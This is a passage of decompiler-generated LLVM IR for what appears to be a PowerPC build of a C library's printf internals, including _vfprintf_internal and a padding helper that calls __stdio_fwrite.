  %v1_10008ca8 = and i32 %arg2, 128
  %v3_10008ca8 = icmp eq i32 %v1_10008ca8, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_10008ca8, label %dec_label_pc_10008cf8, label %dec_label_pc_10008cc4

dec_label_pc_10008cc4:                            ; preds = %entry
  %v0_10008cc4 = call i32 @__GI_strlen()
  %v0_10008cc8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10008cc4, i32* @r31, align 4
  %v0_10008cd0 = load i32, i32* %r26.global-to-local, align 4
  %v1_10008cd4 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008cd4 = sub i32 %v1_10008cd4, %v0_10008cc4
  store i32 %v2_10008cd4, i32* %r29.global-to-local, align 4
  store i32 %v0_10008cc4, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_10008cd4, 1
  br i1 %tmp7, label %dec_label_pc_10008cf8, label %dec_label_pc_10008ce4

dec_label_pc_10008ce4:                            ; preds = %dec_label_pc_10008cc4
  %v1_10008cc8 = urem i32 %v0_10008cc8, 128
  store i32 268471528, i32* @lr, align 4
  %v3_10008ce4 = trunc i32 %v1_10008cc8 to i8
  %v4_10008ce4 = call i32 @_charpad(i32 %v0_10008cd0, i8 %v3_10008ce4, i32 %v2_10008cd4)
  %v0_10008ce8 = load i32, i32* @r31, align 4
  store i32 %v0_10008ce8, i32* %r30.global-to-local, align 4
  %v1_10008cec = load i32, i32* @r29, align 4
  %v4_10008cec = icmp eq i32 %v4_10008ce4, %v1_10008cec
  store i32 %v4_10008ce4, i32* @r28, align 4
  br i1 %v4_10008cec, label %dec_label_pc_10008ce4.dec_label_pc_10008cf8_crit_edge, label %dec_label_pc_10008d1c

dec_label_pc_10008ce4.dec_label_pc_10008cf8_crit_edge: ; preds = %dec_label_pc_10008ce4
  %v0_10008d04.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10008cf8

dec_label_pc_10008cf8:                            ; preds = %dec_label_pc_10008ce4.dec_label_pc_10008cf8_crit_edge, %dec_label_pc_10008cc4, %entry
  %v0_10008d04 = phi i32 [ %v0_10008d04.pre, %dec_label_pc_10008ce4.dec_label_pc_10008cf8_crit_edge ], [ %v0_10008cd0, %dec_label_pc_10008cc4 ], [ %arg1, %entry ]
  %v0_10008d00 = phi i32 [ %v0_10008ce8, %dec_label_pc_10008ce4.dec_label_pc_10008cf8_crit_edge ], [ %v0_10008cc4, %dec_label_pc_10008cc4 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_10008d00, 1
  br i1 %tmp8, label %dec_label_pc_10008d18, label %dec_label_pc_10008d10

dec_label_pc_10008d10:                            ; preds = %dec_label_pc_10008cf8
  %v0_10008cfc = load i32, i32* @r27, align 4
  store i32 268471572, i32* @lr, align 4
  %v3_10008d10 = inttoptr i32 %v0_10008d04 to i16*
  %v4_10008d10 = call i32 @__stdio_fwrite(i32 %v0_10008cfc, i32 %v0_10008d00, i16* %v3_10008d10)
  br label %dec_label_pc_10008d18

dec_label_pc_10008d18:                            ; preds = %dec_label_pc_10008cf8, %dec_label_pc_10008d10
  %v1_10008d18 = phi i32 [ 0, %dec_label_pc_10008cf8 ], [ %v4_10008d10, %dec_label_pc_10008d10 ]
  %v0_10008d18 = load i32, i32* @r28, align 4
  %v2_10008d18 = add i32 %v0_10008d18, %v1_10008d18
  br label %dec_label_pc_10008d1c

dec_label_pc_10008d1c:                            ; preds = %dec_label_pc_10008ce4, %dec_label_pc_10008d18
  %v0_10008d20 = phi i32 [ %v4_10008ce4, %dec_label_pc_10008ce4 ], [ %v2_10008d18, %dec_label_pc_10008d18 ]
  ret i32 %v0_10008d20

; uselistorder directives
  uselistorder i32 %v0_10008d00, { 1, 0 }
  uselistorder i32 %v2_10008cd4, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10008d1c, { 1, 0 }
  uselistorder label %dec_label_pc_10008d18, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r4, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_2()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_2()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v0_10008d38 = load i32, i32* @lr, align 4
  store i32 %v0_10008d38, i32* %r0.global-to-local, align 4
  %v2_10008d40 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10008d40, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* %r24.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 268471644, i32* @lr, align 4
  %v2_10008d58 = call i32 @_ppfs_init(i32* nonnull %stack_var_-200)
  %tmp72 = icmp sgt i32 %v2_10008d58, -1
  br i1 %tmp72, label %dec_label_pc_10008d8c, label %dec_label_pc_10008d64

dec_label_pc_10008d64:                            ; preds = %entry
  %v3_10008d64 = load i32, i32* %stack_var_-200, align 4
  store i32 %v3_10008d64, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v3_10008d64, i32* @r3, align 4
  %v0_10008d70 = call i32 @__GI_strlen()
  %v3_10008d74 = icmp eq i32 %v0_10008d70, 0
  br i1 %v3_10008d74, label %dec_label_pc_1000938c, label %dec_label_pc_10008d7c

dec_label_pc_10008d7c:                            ; preds = %dec_label_pc_10008d64
  %v0_10008d7c = load i32, i32* @r31, align 4
  %v0_10008d80 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008d88.179 to i32), i32* @lr, align 4
  %v3_10008d84 = inttoptr i32 %v0_10008d80 to i16*
  %v4_10008d84 = call i32 @__stdio_fwrite(i32 %v0_10008d7c, i32 %v0_10008d70, i16* %v3_10008d84)
  br label %dec_label_pc_1000938c

dec_label_pc_10008d8c:                            ; preds = %entry
  %v0_10008d90 = load i32, i32* @r31, align 4
  store i32 268471704, i32* @lr, align 4
  %v2_10008d94 = call i32 @_ppfs_prepargs(i32 %v2_10008d40, i32 %v0_10008d90)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_10008e2c = zext i8 %tmp59 to i32
  %v2_10008e30 = icmp sgt i32 %tmp60, 0
  %v2_10008e34 = ptrtoint i32* %stack_var_-112 to i32
  %v2_10008e58 = ptrtoint i32* %stack_var_-344 to i32
  %v3_10008e5c = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_10008e90 = icmp eq i32 %tmp57, 0
  %v2_100091ec = ptrtoint i32* %stack_var_-328 to i32
  %v2_1000910c = ptrtoint i32* %stack_var_-340 to i32
  %v2_10009110 = ptrtoint i32* %stack_var_-336 to i32
  %v5_10008f84 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_10009060 = icmp eq i32 %tmp57, 1
  %v2_10009004 = icmp ugt i32 %tmp57, 2
  %v4_10008f44 = zext i8 %tmp55 to i32
  %v0_10009378.pre = load i32, i32* @r29, align 4
  %v1_10008e44 = mul nuw nsw i32 %v4_10008e2c, 8
  %v2_10008e48 = add i32 %v2_10008e34, %v1_10008e44
  %v1_10008e4c = add i32 %v2_10008e48, -8
  %v1_10008e60 = add i32 %tmp58, 1
  %v2_10008eb8 = icmp ugt i32 %tmp57, 7
  %v2_10009098 = icmp ugt i32 %tmp57, 15
  %v2_100090cc = icmp ugt i32 %tmp57, 17
  %v3_100090cc = icmp eq i32 %tmp57, 17
  %v2_10009174 = icmp ugt i32 %tmp57, 19
  %v3_10009174 = icmp eq i32 %tmp57, 19
  %v3_100091e0 = icmp eq i32 %tmp57, 20
  %v1_10008ed0 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1000eacc.181 to i32), i32 -1)
  %v2_10008ed0 = inttoptr i32 %v1_10008ed0 to i8*
  %v3_10009010 = icmp eq i32 %tmp57, 3
  %v3_10009020 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_10009378

dec_label_pc_10008da4.backedge:                   ; preds = %dec_label_pc_10008df8, %dec_label_pc_10008db0
  %storemerge12.in = phi i32 [ %v1_10008dc0, %dec_label_pc_10008db0 ], [ %v1_10008df8, %dec_label_pc_10008df8 ]
  %v1_10008db815 = phi i32 [ %v0_10008dd0, %dec_label_pc_10008db0 ], [ %v1_10008df8, %dec_label_pc_10008df8 ]
  %storemerge12 = add i32 %storemerge12.in, 1
  store i32 %storemerge12, i32* @r29, align 4
  br label %dec_label_pc_10008da4

dec_label_pc_10008da4:                            ; preds = %dec_label_pc_10008da4.backedge, %dec_label_pc_10009378
  %v0_10008dd0 = phi i32 [ %v1_10008db815, %dec_label_pc_10008da4.backedge ], [ %v0_10009378, %dec_label_pc_10009378 ]
  %v1_10008dc0 = phi i32 [ %storemerge12, %dec_label_pc_10008da4.backedge ], [ %v0_10009378, %dec_label_pc_10009378 ]
  %v1_10008da4 = inttoptr i32 %v1_10008dc0 to i8*
  %v2_10008da4 = load i8, i8* %v1_10008da4, align 1
  %v3_10008da4 = zext i8 %v2_10008da4 to i32
  store i32 %v3_10008da4, i32* %r0.global-to-local, align 4
  %v3_10008da8 = icmp eq i8 %v2_10008da4, 0
  br i1 %v3_10008da8, label %dec_label_pc_10008db8, label %dec_label_pc_10008db0

dec_label_pc_10008db0:                            ; preds = %dec_label_pc_10008da4
  %v3_10008db0 = icmp eq i8 %v2_10008da4, 37
  br i1 %v3_10008db0, label %dec_label_pc_10008db8, label %dec_label_pc_10008da4.backedge

dec_label_pc_10008db8:                            ; preds = %dec_label_pc_10008db0, %dec_label_pc_10008da4
  %v4_10008db8 = icmp eq i32 %v1_10008dc0, %v0_10008dd0
  br i1 %v4_10008db8, label %dec_label_pc_10008dec, label %dec_label_pc_10008dc0

dec_label_pc_10008dc0:                            ; preds = %dec_label_pc_10008db8
  %v2_10008dc0 = sub i32 %v1_10008dc0, %v0_10008dd0
  store i32 %v2_10008dc0, i32* @r31, align 4
  %v4_10008dc0 = icmp sgt i32 %v2_10008dc0, 0
  br i1 %v4_10008dc0, label %dec_label_pc_10008dd0, label %dec_label_pc_10008de0

dec_label_pc_10008dd0:                            ; preds = %dec_label_pc_10008dc0
  %v0_10008dd8 = load i32, i32* %r24.global-to-local, align 4
  store i32 268471776, i32* @lr, align 4
  %v4_10008ddc = inttoptr i32 %v0_10008dd8 to i16*
  %v5_10008ddc = call i32 @__stdio_fwrite(i32 %v0_10008dd0, i32 %v2_10008dc0, i16* %v4_10008ddc)
  %v1_10008de0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008de0

dec_label_pc_10008de0:                            ; preds = %dec_label_pc_10008dc0, %dec_label_pc_10008dd0
  %v1_10008de8 = phi i32 [ %v1_10008de0.pre, %dec_label_pc_10008dd0 ], [ %v2_10008dc0, %dec_label_pc_10008dc0 ]
  %storemerge1 = phi i32 [ %v5_10008ddc, %dec_label_pc_10008dd0 ], [ 0, %dec_label_pc_10008dc0 ]
  %v4_10008de0 = icmp eq i32 %storemerge1, %v1_10008de8
  br i1 %v4_10008de0, label %dec_label_pc_10008de8, label %dec_label_pc_10009388

dec_label_pc_10008de8:                            ; preds = %dec_label_pc_10008de0
  %v0_10008de8 = load i32, i32* %r23.global-to-local, align 4
  %v2_10008de8 = add i32 %v0_10008de8, %v1_10008de8
  store i32 %v2_10008de8, i32* %r23.global-to-local, align 4
  %v0_10008dec.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10008dec

dec_label_pc_10008dec:                            ; preds = %dec_label_pc_10008db8, %dec_label_pc_10008de8
  %v0_10008df8 = phi i32 [ %v0_10008dd0, %dec_label_pc_10008db8 ], [ %v0_10008dec.pre, %dec_label_pc_10008de8 ]
  %v1_10008dec = inttoptr i32 %v0_10008df8 to i8*
  %v2_10008dec = load i8, i8* %v1_10008dec, align 1
  %v3_10008dec = zext i8 %v2_10008dec to i32
  store i32 %v3_10008dec, i32* %r0.global-to-local, align 4
  %v3_10008df0 = icmp eq i8 %v2_10008dec, 0
  br i1 %v3_10008df0, label %dec_label_pc_1000938c, label %dec_label_pc_10008df8

dec_label_pc_10008df8:                            ; preds = %dec_label_pc_10008dec
  %v1_10008df8 = add i32 %v0_10008df8, 1
  %v2_10008df8 = inttoptr i32 %v1_10008df8 to i8*
  %v3_10008df8 = load i8, i8* %v2_10008df8, align 1
  %v4_10008df8 = zext i8 %v3_10008df8 to i32
  store i32 %v4_10008df8, i32* %r0.global-to-local, align 4
  %v3_10008e00 = icmp eq i8 %v3_10008df8, 37
  br i1 %v3_10008e00, label %dec_label_pc_10008da4.backedge, label %dec_label_pc_10008e08

dec_label_pc_10008e08:                            ; preds = %dec_label_pc_10008df8
  store i32 %v2_10008d40, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v1_10008df8, i32* %stack_var_-200, align 4
  store i32 268471840, i32* @lr, align 4
  %v3_10008e1c = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-200, i32 %v1_10008df8)
  store i32 %v2_10008d40, i32* @r3, align 4
  store i32 268471848, i32* @lr, align 4
  %v0_10008e24 = call i32 @_ppfs_setargs()
  store i32 %v4_10008e2c, i32* %r7.global-to-local, align 4
  store i32 %v2_10008e34, i32* %r0.global-to-local, align 4
  br i1 %v2_10008e30, label %dec_label_pc_10008e44, label %dec_label_pc_10008e50

dec_label_pc_10008e44:                            ; preds = %dec_label_pc_10008e08
  br label %dec_label_pc_10008e50

dec_label_pc_10008e50:                            ; preds = %dec_label_pc_10008e08, %dec_label_pc_10008e44
  %v0_10008e7c82 = phi i32 [ %v1_10008e4c, %dec_label_pc_10008e44 ], [ %v2_10008e34, %dec_label_pc_10008e08 ]
  store i32 %v0_10008e7c82, i32* %r10.global-to-local, align 4
  store i32 %v2_10008e58, i32* %r8.global-to-local, align 4
  store i32 %v1_10008e60, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_10008e80.preheader, label %dec_label_pc_10008e80.preheader.thread

dec_label_pc_10008e80.preheader.thread:           ; preds = %dec_label_pc_10008e50
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10008e8c

dec_label_pc_10008e80.preheader:                  ; preds = %dec_label_pc_10008e50
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_10008e5c, label %dec_label_pc_10008e8c, label %dec_label_pc_10008e78.preheader

dec_label_pc_10008e78.preheader:                  ; preds = %dec_label_pc_10008e80.preheader
  store i32 %v0_10008e7c82, i32* %stack_var_-344, align 4
  %v1_10008e7c83 = add i32 %v0_10008e7c82, 8
  store i32 %v1_10008e7c83, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_10008e8888 = add i32 %tmp58, -1
  store i32 %v1_10008e8888, i32* %ctr.global-to-local, align 4
  %v2_10008e8889 = icmp eq i32 %v1_10008e8888, 0
  br i1 %v2_10008e8889, label %dec_label_pc_10008e8c, label %dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge

dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge: ; preds = %dec_label_pc_10008e78.preheader, %dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge.dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge_crit_edge
  %v1_10008e78.pre = phi i32 [ %v1_10008e78.pre.pre, %dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge.dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge_crit_edge ], [ %v2_10008e58, %dec_label_pc_10008e78.preheader ]
  %v1_10008e8091 = phi i32 [ %v1_10008e80, %dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge.dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge_crit_edge ], [ 4, %dec_label_pc_10008e78.preheader ]
  %v1_10008e7c90 = phi i32 [ %v1_10008e7c, %dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge.dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge_crit_edge ], [ %v1_10008e7c83, %dec_label_pc_10008e78.preheader ]
  %v3_10008e78 = add i32 %v1_10008e78.pre, %v1_10008e8091
  %v4_10008e78 = inttoptr i32 %v3_10008e78 to i32*
  store i32 %v1_10008e7c90, i32* %v4_10008e78, align 4
  %v0_10008e7c = load i32, i32* %r10.global-to-local, align 4
  %v1_10008e7c = add i32 %v0_10008e7c, 8
  store i32 %v1_10008e7c, i32* %r10.global-to-local, align 4
  %v0_10008e80 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008e80 = mul i32 %v0_10008e80, 4
  store i32 %v1_10008e80, i32* %r0.global-to-local, align 4
  %v1_10008e84 = add i32 %v0_10008e80, 1
  store i32 %v1_10008e84, i32* %r11.global-to-local, align 4
  %v0_10008e88 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008e88 = add i32 %v0_10008e88, -1
  store i32 %v1_10008e88, i32* %ctr.global-to-local, align 4
  %v2_10008e88 = icmp eq i32 %v1_10008e88, 0
  br i1 %v2_10008e88, label %dec_label_pc_10008e8c, label %dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge.dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge_crit_edge

dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge.dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge_crit_edge: ; preds = %dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge
  %v1_10008e78.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge

dec_label_pc_10008e8c:                            ; preds = %dec_label_pc_10008e78.preheader, %dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge, %dec_label_pc_10008e80.preheader.thread, %dec_label_pc_10008e80.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_10008e90, label %dec_label_pc_10008e98, label %dec_label_pc_10008eb8

dec_label_pc_10008e98:                            ; preds = %dec_label_pc_10008e8c
  %v0_10008e9c = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10008e9c, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_10008e9c, 0
  %v1_10008ea4 = zext i1 %tmp96 to i32
  %v2_10008ea4 = ashr i32 %v0_10008e9c, 31
  %v3_10008ea4 = and i32 %v2_10008ea4, -2
  %v4_10008ea4 = or i32 %v3_10008ea4, %v1_10008ea4
  store i32 %v4_10008ea4, i32* @r5, align 4
  %v1_10008eac = call i32 @__asm_rlwinm(i32 %v0_10008fcc, i32 0, i32 20, i32 23)
  store i32 %v1_10008eac, i32* @r4, align 4
  %v1_10008eb0 = inttoptr i32 %v1_10008eac to i16*
  %v2_10008eb0 = call i32 @_store_inttype(i16* %v1_10008eb0)
  br label %dec_label_pc_10009374

dec_label_pc_10008eb8:                            ; preds = %dec_label_pc_10008e8c
  br i1 %v2_10008eb8, label %dec_label_pc_10009098, label %dec_label_pc_10008ec0

dec_label_pc_10008ec0:                            ; preds = %dec_label_pc_10008eb8
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_10008ed0 = load i8, i8* %v2_10008ed0, align 1
  %v4_10008ed0 = zext i8 %v3_10008ed0 to i32
  store i32 %v4_10008ed0, i32* %r30.global-to-local, align 4
  %v3_10008ed4 = icmp eq i8 %v3_10008ed0, 10
  br i1 %v3_10008ed4, label %dec_label_pc_10008edc, label %dec_label_pc_10008f04

dec_label_pc_10008edc:                            ; preds = %dec_label_pc_10008ec0
  store i32 %v0_10008fcc, i32* %r0.global-to-local, align 4
  %v1_10008ee0 = call i32 @__asm_rlwinm(i32 %v0_10008fcc, i32 26, i32 31, i32 31)
  %v1_10008ee4 = call i32 @__asm_rlwinm(i32 %v0_10008fcc, i32 27, i32 31, i32 31)
  %v3_10008ee8 = icmp eq i32 %v1_10008ee0, 0
  %v2_10008eec = icmp ne i32 %v1_10008ee4, 0
  %not.v2_10008eec = xor i1 %v2_10008eec, true
  %v6_10008ef0 = sext i1 %not.v2_10008eec to i32
  store i32 %v6_10008ef0, i32* %r0.global-to-local, align 4
  %v1_10008ef8 = select i1 %v2_10008eec, i32 44, i32 87
  store i32 %v1_10008ef8, i32* %r31.global-to-local, align 4
  br i1 %v3_10008ee8, label %dec_label_pc_10008f04, label %dec_label_pc_10008f00

dec_label_pc_10008f00:                            ; preds = %dec_label_pc_10008edc
  %v1_10008f00 = or i32 %v1_10008ef8, 128
  store i32 %v1_10008f00, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008f04

dec_label_pc_10008f04:                            ; preds = %dec_label_pc_10008ec0, %dec_label_pc_10008edc, %dec_label_pc_10008f00
  %v0_10008f04 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008f04 = icmp ugt i32 %v0_10008f04, 5
  br i1 %v2_10008f04, label %dec_label_pc_10008f2c, label %dec_label_pc_10008f0c

dec_label_pc_10008f0c:                            ; preds = %dec_label_pc_10008f04
  %v3_10008f0c = icmp eq i32 %v0_10008f04, 3
  br i1 %v3_10008f0c, label %dec_label_pc_10008f14, label %dec_label_pc_10008f1c

dec_label_pc_10008f14:                            ; preds = %dec_label_pc_10008f0c
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008f30

dec_label_pc_10008f1c:                            ; preds = %dec_label_pc_10008f0c
  %v3_10008f1c = icmp eq i32 %v0_10008f04, 1
  br i1 %v3_10008f1c, label %dec_label_pc_10008f34, label %dec_label_pc_10008f30

dec_label_pc_10008f2c:                            ; preds = %dec_label_pc_10008f04
  %v0_10008f2c = load i32, i32* %r30.global-to-local, align 4
  %v1_10008f2c = sub i32 0, %v0_10008f2c
  store i32 %v1_10008f2c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008f30

dec_label_pc_10008f30:                            ; preds = %dec_label_pc_10008f1c, %dec_label_pc_10008f14, %dec_label_pc_10008f2c
  br label %dec_label_pc_10008f34

dec_label_pc_10008f34:                            ; preds = %dec_label_pc_10008f1c, %dec_label_pc_10008f30
  %storemerge2 = phi i32 [ 11, %dec_label_pc_10008f30 ], [ 6, %dec_label_pc_10008f1c ]
  store i32 %storemerge2, i32* @r27, align 4
  %v3_10008f34 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10008f34, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_10008f34, -1
  br i1 %tmp75, label %dec_label_pc_10008f48, label %dec_label_pc_10008f44

dec_label_pc_10008f44:                            ; preds = %dec_label_pc_10008f34
  br label %dec_label_pc_10008f48

dec_label_pc_10008f48:                            ; preds = %dec_label_pc_10008f34, %dec_label_pc_10008f44
  %storemerge = phi i32 [ %v4_10008f44, %dec_label_pc_10008f44 ], [ 32, %dec_label_pc_10008f34 ]
  store i32 %storemerge, i32* %r26.global-to-local, align 4
  %v3_10008f48 = icmp eq i32 %v0_10008f04, 1
  br i1 %v3_10008f48, label %dec_label_pc_10008f64, label %dec_label_pc_10008f54

dec_label_pc_10008f54:                            ; preds = %dec_label_pc_10008f48
  %v0_10008f54 = load i32, i32* %r7.global-to-local, align 4
  %v1_10008f54 = mul i32 %v0_10008f54, 4
  store i32 %v1_10008f54, i32* %r0.global-to-local, align 4
  %v0_10008f58 = load i32, i32* @r1, align 4
  %v2_10008f58 = add i32 %v0_10008f58, %v1_10008f54
  %v1_10008f5c = add i32 %v2_10008f58, 188
  %v2_10008f5c = inttoptr i32 %v1_10008f5c to i32*
  %v3_10008f5c = load i32, i32* %v2_10008f5c, align 4
  store i32 %v3_10008f5c, i32* %r0.global-to-local, align 4
  %v1_10008f60 = call i32 @__asm_rlwinm(i32 %v3_10008f5c, i32 0, i32 20, i32 23)
  br label %dec_label_pc_10008f64

dec_label_pc_10008f64:                            ; preds = %dec_label_pc_10008f48, %dec_label_pc_10008f54
  %v3_10008f64 = load i32, i32* %stack_var_-344, align 4
  %v0_10008f68 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10008f68, i32* @r5, align 4
  %v2_10008f6c = inttoptr i32 %v0_10008f68 to i32*
  %v3_10008f6c = call i32 @_load_inttype(i32 %v3_10008f64, i32* %v2_10008f6c)
  store i32 %v0_10008f68, i32* %r7.global-to-local, align 4
  %v0_10008f7c = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10008f7c, i32* %r8.global-to-local, align 4
  %v6_10008f84 = call i32 @_uintmaxtostr(i8* %v5_10008f84, i32 %v3_10008f6c, i32 %v3_10008f64, i32 %v0_10008f68, i32 %v0_10008f7c)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_10008f84, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_10008fd8, label %dec_label_pc_10008f98

dec_label_pc_10008f98:                            ; preds = %dec_label_pc_10008f64
  %v7_10008f84 = inttoptr i32 %v6_10008f84 to i8*
  %v3_10008f98 = load i8, i8* %v7_10008f84, align 1
  %v4_10008f98 = zext i8 %v3_10008f98 to i32
  store i32 %v4_10008f98, i32* %r0.global-to-local, align 4
  %v3_10008fa0 = icmp eq i8 %v3_10008f98, 45
  br i1 %v3_10008fa0, label %dec_label_pc_10008fa8, label %dec_label_pc_10008fbc

dec_label_pc_10008fa8:                            ; preds = %dec_label_pc_10008f98
  %v1_10008fa8 = or i32 %v0_10008fcc, 2
  store i32 %v1_10008fa8, i32* %r0.global-to-local, align 4
  %v2_10008fac = add i32 %v6_10008f84, 1
  store i32 %v2_10008fac, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_10008fd8

dec_label_pc_10008fbc:                            ; preds = %dec_label_pc_10008f98
  %v1_10008fbc = and i32 %v0_10008fcc, 2
  store i32 %v1_10008fbc, i32* %r0.global-to-local, align 4
  %v3_10008fbc = icmp eq i32 %v1_10008fbc, 0
  br i1 %v3_10008fbc, label %dec_label_pc_10008fcc, label %dec_label_pc_10008fc4

dec_label_pc_10008fc4:                            ; preds = %dec_label_pc_10008fbc
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10008fd8

dec_label_pc_10008fcc:                            ; preds = %dec_label_pc_10008fbc
  %v1_10008fcc = urem i32 %v0_10008fcc, 2
  store i32 %v1_10008fcc, i32* %r11.global-to-local, align 4
  %v3_10008fcc = icmp eq i32 %v1_10008fcc, 0
  br i1 %v3_10008fcc, label %dec_label_pc_10008fd8, label %dec_label_pc_10008fd4

dec_label_pc_10008fd4:                            ; preds = %dec_label_pc_10008fcc
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_10008fd8

dec_label_pc_10008fd8:                            ; preds = %dec_label_pc_10008fcc, %dec_label_pc_10008f64, %dec_label_pc_10008fc4, %dec_label_pc_10008fa8, %dec_label_pc_10008fd4
  %v0_10009044 = phi i32 [ %v6_10008f84, %dec_label_pc_10008f64 ], [ %v2_10008fac, %dec_label_pc_10008fa8 ], [ %v6_10008f84, %dec_label_pc_10008fcc ], [ %v6_10008f84, %dec_label_pc_10008fd4 ], [ %v6_10008f84, %dec_label_pc_10008fc4 ]
  %stack_var_-184.0 = phi i32 [ %v0_10008fcc, %dec_label_pc_10008f64 ], [ %v1_10008fa8, %dec_label_pc_10008fa8 ], [ %v0_10008fcc, %dec_label_pc_10008fcc ], [ %v0_10008fcc, %dec_label_pc_10008fd4 ], [ %v0_10008fcc, %dec_label_pc_10008fc4 ]
  %v3_10008fd8 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_100091ec, i32* %r0.global-to-local, align 4
  %v2_10008fe0 = sub i32 %v2_100091ec, %v0_10009044
  %v1_10008fe8 = add i32 %v2_10008fe0, 127
  store i32 %v1_10008fe8, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_10008fd8, -1
  br i1 %tmp76, label %dec_label_pc_10008ff4, label %dec_label_pc_10008ff0

dec_label_pc_10008ff0:                            ; preds = %dec_label_pc_10008fd8
  br label %dec_label_pc_10008ff4

dec_label_pc_10008ff4:                            ; preds = %dec_label_pc_10008fd8, %dec_label_pc_10008ff0
  %v0_10009028 = phi i32 [ %v3_10008fd8, %dec_label_pc_10008fd8 ], [ 1, %dec_label_pc_10008ff0 ]
